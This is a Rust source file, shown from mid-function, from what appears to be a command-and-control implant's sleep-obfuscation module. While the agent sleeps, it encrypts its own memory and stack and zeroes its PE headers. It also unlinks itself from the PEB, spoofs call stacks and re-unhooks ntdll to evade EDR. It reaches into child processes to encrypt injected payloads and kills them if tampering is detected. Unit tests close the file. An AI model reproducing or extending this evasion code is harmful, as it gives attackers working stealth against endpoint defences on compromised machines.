        let actual_old = match protect_memory(base, size, PAGE_READWRITE) {
            Some(p) => p,
            None => continue,
        };

        // Encrypt in chunks.
        let (nonce, tags) = match encrypt_region_chunks(&key, base, size) {
            Ok(r) => r,
            Err(e) => {
                log::error!("[sleep_obfuscation] encrypt failed for {:p}: {}", base, e);
                // Restore protection.
                let _ = protect_memory(base, size, actual_old);
                continue;
            }
        };

        let n_chunks = tags.len();

        snapshots.push(RegionSnapshot {
            base,
            size,
            orig_prot: actual_old,
            nonce,
            tags,
            n_chunks,
        });
    }

    // ── 4. Encrypt stack ───────────────────────────────────────────────────
    let stack_info = if config.encrypt_stack {
        encrypt_stack(&key, 512)
    } else {
        None
    };

    // ── 5. Anti-forensics ──────────────────────────────────────────────────
    let header_backup = if config.anti_forensics {
        let backup = backup_pe_headers();
        zero_pe_headers();
        backup
    } else {
        Vec::new()
    };

    let peb_links = if config.anti_forensics {
        unlink_from_peb()
    } else {
        None
    };

    // ── 5a. Memory hygiene (PEB scrub, thread start, handle table) ─────────
    if config.anti_forensics {
        crate::memory_hygiene::run_all_hygiene();
    }

    // Set all encrypted regions to PAGE_NOACCESS.
    if config.anti_forensics {
        for snap in &snapshots {
            let _ = protect_memory(snap.base, snap.size, PAGE_NOACCESS);
        }
    }

    // ── 5b. Encrypt remote (child) process regions ─────────────────────────
    encrypt_remote_regions();

    // ── 6. Spoof call stack ────────────────────────────────────────────────
    let stack_spoof = if config.spoof_return_address {
        spoof_call_stack(&config.fake_module_name)
    } else {
        None
    };

    // ── 7. Sleep via NtDelayExecution ──────────────────────────────────────
    {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
        if let Some(base) = ntdll {
            if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                base,
                pe_resolve::hash_str(b"NtDelayExecution\0"),
            ) {
                let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
                    std::mem::transmute(addr);
                let mut delay_100ns = duration_to_100ns(duration);
                nt_delay(0, &mut delay_100ns);
            } else {
                // Fallback to kernel32 Sleep.
                winapi::um::synchapi::Sleep(duration.as_millis() as u32);
            }
        } else {
            winapi::um::synchapi::Sleep(duration.as_millis() as u32);
        }
    }

    // ── 8. Wake: retrieve key and verify / decrypt ─────────────────────────
    let key = handle.retrieve();

    // Restore PAGE_READWRITE on all regions first.
    for snap in &snapshots {
        let _ = protect_memory(snap.base, snap.size, PAGE_READWRITE);
    }

    // Verify and decrypt all regions.
    for snap in &snapshots {
        if let Err(e) = decrypt_region_chunks(&key, snap.base, snap.size, &snap.nonce, &snap.tags) {
            log::error!("[sleep_obfuscation] AEAD failure: {}", e);
            // Self-destruct: AEAD tag mismatch means memory was tampered with.
            self_destruct();
        }
    }

    // Restore original protections.
    for snap in &snapshots {
        let _ = protect_memory(snap.base, snap.size, snap.orig_prot);
    }

    // ── 8b. Decrypt remote (child) process regions ────────────────────────
    decrypt_remote_regions();

    // ── 9. Decrypt stack ───────────────────────────────────────────────────
    if let Some((s_base, s_size, s_orig_prot, s_nonce, s_tag)) = stack_info {
        if let Err(e) = decrypt_stack(&key, s_base, s_size, &s_nonce, &s_tag) {
            log::error!("[sleep_obfuscation] Stack AEAD failure: {}", e);
            self_destruct();
        }
        let _ = protect_memory(s_base, s_size, s_orig_prot);
    }

    // ── 10. Restore anti-forensics state ───────────────────────────────────
    if config.anti_forensics {
        // Re-link in PEB (best-effort: restore the links we saved).
        if let Some((load_flink, load_blink, mem_flink, mem_blink)) = peb_links {
            // We can't perfectly re-link because other modules may have been
            // loaded/unloaded while we slept.  The entry itself is still valid
            // in memory; we just need to re-insert it.
            // For now, we do a best-effort restore of the immediate neighbours.
            restore_peb_links(load_flink, load_blink, mem_flink, mem_blink);
        }
        // Restore PE headers.
        if !header_backup.is_empty() {
            restore_pe_headers(&header_backup);
        }
    }

    // ── 11. Restore spoofed call stack ─────────────────────────────────────
    if let Some(spoof) = stack_spoof {
        restore_call_stack(spoof);
    }

    // ── 12. Post-wake ntdll hook re-check ──────────────────────────────────
    //
    // EDR may have re-hooked ntdll syscall stubs while the agent was sleeping
    // (the sleep obfuscation made the agent's memory inaccessible, but EDR
    // can still patch ntdll which is a shared module).  Check for hooks and
    // re-unhook if necessary.
    #[cfg(windows)]
    {
        if let Err(e) = crate::ntdll_unhook::maybe_unhook() {
            log::warn!(
                "[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}"
            );
        }
    }

    // Update region cache for potential reuse.
    {
        let mut cache = region_cache().lock().unwrap();
        cache.0 = gen;
        cache.1 = snapshots;
    }

    // Zero the key from the stack.
    let mut key_zero = key;
    key_zero.zeroize();

    log::debug!(
        "[sleep_obfuscation] secure_sleep completed ({} ms)",
        config.sleep_duration_ms
    );

    Ok(())
}

/// Best-effort restore of PEB module list links.
///
/// We re-insert our entry between the saved neighbours.  If the neighbours
/// have changed (modules loaded/unloaded during sleep), this is a best-effort
/// operation — the PEB list may have minor inconsistencies but the agent's
/// own entry will be present.
unsafe fn restore_peb_links(
    load_flink: *mut u8,
    load_blink: *mut u8,
    mem_flink: *mut u8,
    mem_blink: *mut u8,
) {
    // Re-link InLoadOrderLinks.
    if !load_flink.is_null() && !load_blink.is_null() {
        let flink_entry = load_flink as *mut usize;
        let blink_entry = load_blink.add(0x08) as *mut usize;
        *flink_entry = load_blink as usize;
        *blink_entry = load_flink as usize;
    }

    // Re-link InMemoryOrderLinks.
    if !mem_flink.is_null() && !mem_blink.is_null() {
        let flink_entry = mem_flink as *mut usize;
        let blink_entry = mem_blink.add(0x08) as *mut usize;
        *flink_entry = mem_blink as usize;
        *blink_entry = mem_flink as usize;
    }
}

// ── Remote process registry ─────────────────────────────────────────────────
//
// Allows the local agent to encrypt child injected payloads during its own
// sleep cycle.  When `secure_sleep` runs, it also encrypts the registered
// remote regions via NtWriteVirtualMemory / NtReadVirtualMemory (indirect
// syscalls), creating a cohesive parent-child sleep obfuscation system.

/// Metadata for a remote process region enrolled in sleep obfuscation.
#[derive(Clone)]
struct RemoteProcess {
    /// PID of the target (child) process.
    pid: u32,
    /// Base address of the payload region in the target process.
    base_addr: usize,
    /// Size of the payload region.
    size: usize,
    /// 32-byte XChaCha20-Poly1305 key used for this remote region.
    key: [u8; 32],
    /// Per-region nonce (refreshed each sleep cycle).
    nonce: [u8; MAX_NONCE],
    /// Per-chunk AEAD tags.
    tags: Vec<[u8; TAG_LEN]>,
    /// Original page protection of the remote region.
    orig_protect: u32,
    /// Process handle kept open for cross-process operations.
    process_handle: usize,
}

/// Global registry of remote processes enrolled in sleep obfuscation.
static REMOTE_PROCESSES: OnceLock<std::sync::Mutex<Vec<RemoteProcess>>> = OnceLock::new();

fn remote_processes() -> &'static std::sync::Mutex<Vec<RemoteProcess>> {
    REMOTE_PROCESSES.get_or_init(|| std::sync::Mutex::new(Vec::new()))
}

/// Open a process handle via NtOpenProcess (indirect syscall) with VM
/// read/write/operation access.
unsafe fn open_remote_process(pid: u32) -> Option<usize> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtOpenProcess\0"),
    )?;

    // PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
    const ACCESS_MASK: u64 = (0x0008 | 0x0010 | 0x0020) as u64;

    let mut obj_attr: [u64; 3] = [0; 3]; // OBJECT_ATTRIBUTES (simplified)
    obj_attr[0] = std::mem::size_of::<[u64; 3]>() as u64; // Length

    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;

    let mut handle: usize = 0;
    let nt_open: extern "system" fn(
        *mut usize,
        u64,
        *mut u64,
        *mut u64,
    ) -> i32 = std::mem::transmute(func_addr);

    let status = nt_open(
        &mut handle,
        ACCESS_MASK,
        obj_attr.as_mut_ptr(),
        client_id.as_mut_ptr(),
    );

    if status != 0 || handle == 0 {
        None
    } else {
        Some(handle)
    }
}

/// Read memory from a remote process via NtReadVirtualMemory (indirect syscall).
unsafe fn remote_read(
    process_handle: usize,
    base: usize,
    buf: &mut [u8],
) -> bool {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtReadVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    let nt_read: extern "system" fn(
        usize,   // ProcessHandle
        *mut u8, // BaseAddress (const in target)
        *mut u8, // Buffer
        usize,   // NumberOfBytesToRead
        *mut usize, // NumberOfBytesRead
    ) -> i32 = std::mem::transmute(func_addr);

    let mut bytes_read: usize = 0;
    let status = nt_read(
        process_handle,
        base as *mut u8,
        buf.as_mut_ptr(),
        buf.len(),
        &mut bytes_read,
    );

    status == 0 && bytes_read == buf.len()
}

/// Write memory to a remote process via NtWriteVirtualMemory (indirect syscall).
unsafe fn remote_write(
    process_handle: usize,
    base: usize,
    buf: &[u8],
) -> bool {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtWriteVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    let nt_write: extern "system" fn(
        usize,   // ProcessHandle
        *const u8, // BaseAddress
        *const u8, // Buffer
        usize,   // NumberOfBytesToWrite
        *mut usize, // NumberOfBytesWritten
    ) -> i32 = std::mem::transmute(func_addr);

    let mut bytes_written: usize = 0;
    let status = nt_write(
        process_handle,
        base as *const u8,
        buf.as_ptr(),
        buf.len(),
        &mut bytes_written,
    );

    status == 0 && bytes_written == buf.len()
}

/// Change page protection in a remote process via NtProtectVirtualMemory
/// (indirect syscall).
unsafe fn remote_protect(
    process_handle: usize,
    base: usize,
    size: usize,
    new_prot: u32,
) -> Option<u32> {
    let mut base_addr = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let mut old_prot: u32 = 0;

    #[cfg(feature = "direct-syscalls")]
    {
        let status = crate::syscalls::syscall_NtProtectVirtualMemory(
            process_handle as u64,
            &mut base_addr as *mut _ as usize as u64,
            &mut region_size as *mut _ as usize as u64,
            new_prot as u64,
            &mut old_prot as *mut _ as usize as u64,
        );
        if status != 0 {
            return None;
        }
        Some(old_prot)
    }

    #[cfg(not(feature = "direct-syscalls"))]
    {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let func_addr = pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
        )?;

        let nt_protect: extern "system" fn(
            usize,                 // ProcessHandle
            *mut *mut std::ffi::c_void, // BaseAddress
            *mut usize,            // RegionSize
            u32,                   // NewProtect
            *mut u32,              // OldProtect
        ) -> i32 = std::mem::transmute(func_addr);

        let status = nt_protect(
            process_handle,
            &mut base_addr,
            &mut region_size,
            new_prot,
            &mut old_prot,
        );

        if status != 0 {
            None
        } else {
            Some(old_prot)
        }
    }
}

/// Register a remote (child) process's memory region for sleep obfuscation.
///
/// When the local agent calls `secure_sleep`, it will also encrypt the
/// registered remote region via cross-process memory operations.  The key
/// for the remote region is derived independently from the local key.
///
/// # Arguments
///
/// * `pid` — PID of the target process.
/// * `base_addr` — Base address of the payload region in the target.
/// * `size` — Size of the payload region in bytes.
/// * `key` — 32-byte encryption key for the remote region.
///
/// # Returns
///
/// `Ok(())` on success, or an error if the process cannot be opened or
/// the region is invalid.
pub fn register_remote_process(
    pid: u32,
    base_addr: usize,
    size: usize,
    key: [u8; 32],
) -> Result<()> {
    if size == 0 || base_addr == 0 {
        return Err(anyhow!("invalid remote region: base={:#x}, size={}", base_addr, size));
    }

    let process_handle = unsafe { open_remote_process(pid) }
        .ok_or_else(|| anyhow!("cannot open remote process pid {}", pid))?;

    // Query the current protection of the remote region.
    let orig_protect = unsafe { remote_protect(process_handle, base_addr, size, PAGE_READWRITE) }
        .unwrap_or(PAGE_EXECUTE_READ);

    // Restore original protection after querying.
    if orig_protect != PAGE_READWRITE {
        let _ = unsafe { remote_protect(process_handle, base_addr, size, orig_protect) };
    }

    let entry = RemoteProcess {
        pid,
        base_addr,
        size,
        key,
        nonce: [0u8; MAX_NONCE],
        tags: Vec::new(),
        orig_protect,
        process_handle,
    };

    let mut registry = remote_processes().lock().unwrap();

    // Check for duplicate PID — replace existing entry.
    if let Some(existing) = registry.iter_mut().find(|r| r.pid == pid) {
        // Close old handle.
        unsafe {
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                    base,
                    pe_resolve::hash_str(b"NtClose\0"),
                ) {
                    let nt_close: extern "system" fn(usize) -> i32 =
                        std::mem::transmute(addr);
                    nt_close(existing.process_handle);
                }
            }
        }
        *existing = entry;
    } else {
        registry.push(entry);
    }

    log::info!(
        "[sleep_obfuscation] registered remote process pid={} base={:#x} size={}",
        pid, base_addr, size
    );

    Ok(())
}

/// Unregister a remote process from sleep obfuscation.
///
/// Closes the process handle and removes the entry from the registry.
/// Should be called before freeing injected memory in the target.
pub fn unregister_remote_process(pid: u32) {
    let mut registry = remote_processes().lock().unwrap();

    let idx = registry.iter().position(|r| r.pid == pid);
    if let Some(i) = idx {
        let removed = registry.remove(i);

        // Close the process handle.
        unsafe {
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                    base,
                    pe_resolve::hash_str(b"NtClose\0"),
                ) {
                    let nt_close: extern "system" fn(usize) -> i32 =
                        std::mem::transmute(addr);
                    nt_close(removed.process_handle);
                }
            }
        }

        log::info!(
            "[sleep_obfuscation] unregistered remote process pid={}",
            pid
        );
    }
}

/// Encrypt all registered remote process regions.
///
/// Called by `secure_sleep` after encrypting local regions.  Each remote
/// region is read, encrypted in-place, and written back.  The nonce and
/// tags are stored in the registry entry for decryption on wake.
unsafe fn encrypt_remote_regions() {
    let mut registry = remote_processes().lock().unwrap();

    for remote in registry.iter_mut() {
        let size = remote.size;
        let mut buf = vec![0u8; size];

        // Read the remote region.
        if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
            log::warn!(
                "[sleep_obfuscation] failed to read remote pid={} base={:#x}",
                remote.pid,
                remote.base_addr
            );
            continue;
        }

        // Change remote protection to PAGE_READWRITE.
        let old_prot = remote_protect(
            remote.process_handle,
            remote.base_addr,
            size,
            PAGE_READWRITE,
        );

        // Encrypt in chunks.
        let mut nonce = [0u8; MAX_NONCE];
        OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);

        let cipher = match XChaCha20Poly1305::new_from_slice(&remote.key) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

        let n_chunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
        let mut tags = Vec::with_capacity(n_chunks);

        let mut offset = 0usize;
        let mut encrypt_ok = true;
        while offset < size {
            let end = (offset + CHUNK_SIZE).min(size);
            let chunk_len = end - offset;

            let chunk_slice = &buf[offset..end];
            let ct_tag = match cipher.encrypt(xnonce, chunk_slice as &[u8]) {
                Ok(ct) => ct,
                Err(_) => {
                    encrypt_ok = false;
                    break;
                }
            };

            let ct_len = ct_tag.len() - TAG_LEN;
            buf[offset..offset + ct_len].copy_from_slice(&ct_tag[..ct_len]);

            let mut tag = [0u8; TAG_LEN];
            tag.copy_from_slice(&ct_tag[ct_len..]);
            tags.push(tag);

            offset = end;
        }

        if !encrypt_ok {
            // Restore original protection.
            if let Some(old) = old_prot {
                let _ = remote_protect(
                    remote.process_handle,
                    remote.base_addr,
                    size,
                    old,
                );
            }
            continue;
        }

        // Write encrypted data back to the remote process.
        if !remote_write(remote.process_handle, remote.base_addr, &buf) {
            log::warn!(
                "[sleep_obfuscation] failed to write encrypted data to remote pid={}",
                remote.pid
            );
            if let Some(old) = old_prot {
                let _ = remote_protect(
                    remote.process_handle,
                    remote.base_addr,
                    size,
                    old,
                );
            }
            continue;
        }

        // Set remote region to PAGE_NOACCESS for maximum stealth.
        let final_prot = if let Some(old) = old_prot {
            let _ = remote_protect(
                remote.process_handle,
                remote.base_addr,
                size,
                PAGE_NOACCESS,
            );
            old
        } else {
            remote.orig_protect
        };

        // Save nonce, tags, and actual original protection.
        remote.nonce = nonce;
        remote.tags = tags;
        remote.orig_protect = final_prot;
    }
}

/// Decrypt all registered remote process regions on wake.
///
/// Verifies AEAD tags for every chunk.  On failure, the remote process is
/// terminated (tampered child = potential detection vector).
unsafe fn decrypt_remote_regions() {
    let registry = remote_processes().lock().unwrap();

    for remote in registry.iter() {
        let size = remote.size;
        let mut buf = vec![0u8; size];

        // Restore PAGE_READWRITE first.
        let _ = remote_protect(
            remote.process_handle,
            remote.base_addr,
            size,
            PAGE_READWRITE,
        );

        // Read the encrypted data from the remote process.
        if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
            log::error!(
                "[sleep_obfuscation] failed to read encrypted remote pid={} — may be dead",
                remote.pid
            );
            continue;
        }

        // Decrypt and verify AEAD tags.
        let cipher = match XChaCha20Poly1305::new_from_slice(&remote.key) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let xnonce = XNonce::from_slice(&remote.nonce[..NONCE_LEN]);

        let mut offset = 0usize;
        let mut chunk_idx = 0usize;
        let mut decrypt_ok = true;

        while offset < size {
            let end = (offset + CHUNK_SIZE).min(size);
            let chunk_len = end - offset;

            let tag = match remote.tags.get(chunk_idx) {
                Some(t) => t,
                None => {
                    decrypt_ok = false;
                    break;
                }
            };

            let mut combined = Vec::with_capacity(chunk_len + TAG_LEN);
            combined.extend_from_slice(&buf[offset..offset + chunk_len]);
            combined.extend_from_slice(tag);

            match cipher.decrypt(xnonce, combined.as_slice()) {
                Ok(pt) => {
                    buf[offset..offset + pt.len()].copy_from_slice(&pt);
                }
                Err(_) => {
                    log::error!(
                        "[sleep_obfuscation] remote AEAD tag mismatch: pid={} chunk={} — \
                         terminating child process",
                        remote.pid,
                        chunk_idx
                    );
                    decrypt_ok = false;
                    break;
                }
            }

            offset = end;
            chunk_idx += 1;
        }

        if decrypt_ok {
            // Write decrypted data back.
            if !remote_write(remote.process_handle, remote.base_addr, &buf) {
                log::error!(
                    "[sleep_obfuscation] failed to write decrypted data to remote pid={}",
                    remote.pid
                );
            }

            // Restore original protection.
            let _ = remote_protect(
                remote.process_handle,
                remote.base_addr,
                size,
                remote.orig_protect,
            );
        } else {
            // AEAD failure — terminate the remote process to prevent
            // detection of tampered/corrupted payload.
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                    base,
                    pe_resolve::hash_str(b"NtTerminateProcess\0"),
                ) {
                    let nt_term: extern "system" fn(usize, u32) -> i32 =
                        std::mem::transmute(addr);
                    nt_term(remote.process_handle, 1);
                }
            }
        }
    }
}

// ── Non-Windows stub ────────────────────────────────────────────────────────

// The module is gated by #![cfg(windows)] at the top, so no stubs needed here.
// Non-Windows targets will not compile this module at all.

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_config_has_sensible_defaults() {
        let cfg = SleepObfuscationConfig::default();
        assert_eq!(cfg.sleep_duration_ms, 5000);
        assert!(cfg.encryption_key.is_none());
        assert!(cfg.encrypt_stack);
        assert!(!cfg.encrypt_heap);
        assert!(cfg.spoof_return_address);
        assert!(cfg.fake_module_name.is_none());
        assert!(cfg.anti_forensics);
    }

    #[test]
    fn duration_to_100ns_is_negative() {
        let dur = std::time::Duration::from_secs(5);
        let v = duration_to_100ns(dur);
        assert!(v < 0, "relative timeout must be negative, got {}", v);
    }

    #[test]
    fn is_encodable_protect_filters_correctly() {
        // Code sections: always encrypt.
        assert!(is_encodable_protect(PAGE_EXECUTE_READ, false));
        assert!(is_encodable_protect(PAGE_EXECUTE_READWRITE, false));
        assert!(is_encodable_protect(PAGE_EXECUTE, false));

        // Data sections: only when include_heap is true.
        assert!(!is_encodable_protect(PAGE_READWRITE, false));
        assert!(is_encodable_protect(PAGE_READWRITE, true));
        assert!(!is_encodable_protect(PAGE_READONLY, false));
        assert!(is_encodable_protect(PAGE_READONLY, true));

        // NoAccess: never encrypt.
        assert!(!is_encodable_protect(PAGE_NOACCESS, true));
        assert!(!is_encodable_protect(PAGE_NOACCESS, false));
    }

    #[test]
    fn key_handle_stash_and_retrieve_roundtrip() {
        let original = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        let handle = KeyHandle::stash(original);
        let retrieved = handle.retrieve();
        assert_eq!(original, retrieved, "key must survive XMM round-trip");
    }

    #[test]
    fn chunked_encrypt_decrypt_roundtrip() {
        let key = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        // Allocate a 128 KB buffer.
        let size = 128 * 1024;
        let mut buf: Vec<u8> = vec![0u8; size];
        OsRng.fill_bytes(&mut buf);

        let original = buf.clone();

        let (nonce, tags) =
            encrypt_region_chunks(&key, buf.as_mut_ptr(), size).expect("encrypt should succeed");

        // Verify the ciphertext differs from plaintext.
        assert_ne!(buf, original, "ciphertext must differ from plaintext");

        decrypt_region_chunks(&key, buf.as_mut_ptr(), size, &nonce, &tags)
            .expect("decrypt should succeed");

        assert_eq!(buf, original, "decrypted data must match original");
    }

    #[test]
    fn tampered_tag_causes_decrypt_failure() {
        let key = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        let size = 64 * 1024;
        let mut buf: Vec<u8> = vec![0u8; size];
        OsRng.fill_bytes(&mut buf);

        let (nonce, mut tags) =
            encrypt_region_chunks(&key, buf.as_mut_ptr(), size).expect("encrypt should succeed");

        // Tamper with the tag.
        tags[0][0] ^= 0xFF;

        let result = decrypt_region_chunks(&key, buf.as_mut_ptr(), size, &nonce, &tags);
        assert!(result.is_err(), "tampered tag must cause decryption failure");
    }

    #[test]
    fn register_remote_validates_inputs() {
        // Zero base address should fail.
        let result = register_remote_process(1234, 0, 4096, [0u8; 32]);
        assert!(result.is_err(), "zero base_addr should be rejected");

        // Zero size should fail.
        let result = register_remote_process(1234, 0x10000, 0, [0u8; 32]);
        assert!(result.is_err(), "zero size should be rejected");
    }

    #[test]
    fn unregister_nonexistent_is_noop() {
        // Should not panic or return error for a PID that doesn't exist.
        unregister_remote_process(99999);
    }
}
